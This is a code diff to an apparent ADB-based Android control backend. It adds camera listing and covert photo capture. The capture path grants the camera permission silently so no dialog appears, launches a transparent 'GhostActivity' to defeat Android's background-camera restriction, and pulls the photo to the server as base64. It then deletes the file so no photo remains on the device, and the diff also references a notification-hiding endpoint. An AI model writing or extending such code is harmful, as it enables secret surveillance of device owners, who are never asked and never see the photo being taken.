@@ -1,4 +1,5 @@
 import json
+import shlex
 import socket
 import subprocess
 import threading
@@ -8,6 +9,7 @@ from fastapi import APIRouter
 from pydantic import BaseModel, Field
 
 from config import logger
+from routes.adb_utils import FileReadRequest, read_file_base64
 from utils.tool_manager import get_adb_path, get_probe_apk_path
 
 router = APIRouter(
@@ -395,14 +397,32 @@ def probe_hide_notification(req: ProbeRequest):
     return {"code": 200, "message": "已执行隐藏通知兜底命令", "data": {"results": results}}
 
 
+@router.post("/probe/cameras")
+def probe_cameras(req: ProbeRequest):
+    """返回设备摄像头列表（id / facing / resolution），复用 0x02 设备详细信息帧。"""
+    device_id = (req.deviceId or "").strip()
+    if not device_id:
+        return {"code": 400, "message": "deviceId 不能为空", "data": {"cameras": []}}
+    d = run_probe(device_id, False, CMD_DEVICE_INFO, {})
+    if not d.get("connected"):
+        return {"code": 500, "message": d.get("reason", "通讯失败"), "data": {"cameras": []}}
+    resp = d.get("response") or {}
+    if resp.get("code") != 200:
+        return {"code": 500, "message": resp.get("message", "设备返回错误"), "data": {"cameras": []}}
+    cameras = (resp.get("data") or {}).get("cameras") or []
+    return {"code": 200, "message": "success", "data": {"cameras": cameras}}
+
+
 @router.post("/probe/capture")
 def probe_capture(req: ProbeCaptureRequest):
-    """截图 / 拍照：文件存设备端应用外部目录，前端再经 /device/files/base64 读取显示。
+    """截图 / 拍照。
 
-    kind=screenshot 发 0x09 screencap（app 直连被拒时设备端自动回退 su）；
+    kind=screenshot 发 0x09 screencap，响应里带设备端路径，前端经 /device/files/base64 读取预览；
     kind=photo 先 pm grant 授予 CAMERA 运行时权限（probe 不弹授权框），再拉起透明
     GhostActivity 让进程短暂回到前台（Android 11 后台启动的 FGS 无 CAMERA capability，
     CameraService 会拒 CAMERA_DISABLED disabled by policy），然后发 0x0A 拍照。
+    照片由服务端读成 base64 放进响应 data.response.data.base64，随后立即删除设备端文件，
+    设备上不留存照片。
     """
     device_id = (req.deviceId or "").strip()
     if not device_id:
@@ -421,7 +441,29 @@ def probe_capture(req: ProbeCaptureRequest):
         logger.warning(f"probe ghost activity device={device_id} rc={grc} {gerr or gout}")
     time.sleep(1.0)
     data = {"cameraId": req.cameraId} if req.cameraId else {}
-    return _result(device_id, False, CMD_CAMERA, data)
+    result = _result(device_id, False, CMD_CAMERA, data)
+    resp = (result.get("data") or {}).get("response") or {}
+    info = resp.get("data") if isinstance(resp.get("data"), dict) else {}
+    path = (info.get("path") or "").strip()
+    if resp.get("code") == 200 and path:
+        try:
+            pulled = read_file_base64(FileReadRequest(deviceId=device_id, remotePath=path))
+            if pulled.get("code") == 200:
+                info["base64"] = (pulled.get("data") or {}).get("base64", "")
+            else:
+                info["readError"] = pulled.get("message", "读取照片失败")
+        except Exception as e:
+            info["readError"] = f"{type(e).__name__}: {e}"
+        # 读成功与否都删除，避免设备端残留照片
+        try:
+            drc, _, derr = _adb(device_id, "shell", "rm", "-f", shlex.quote(path))
+            info["deleted"] = drc == 0
+            if drc != 0:
+                logger.warning(f"probe delete photo failed device={device_id} path={path} {derr}")
+        except Exception as e:
+            info["deleted"] = False
+            logger.warning(f"probe delete photo failed device={device_id} path={path} {e}")
+    return result
 
 
 @router.post("/probe/message")
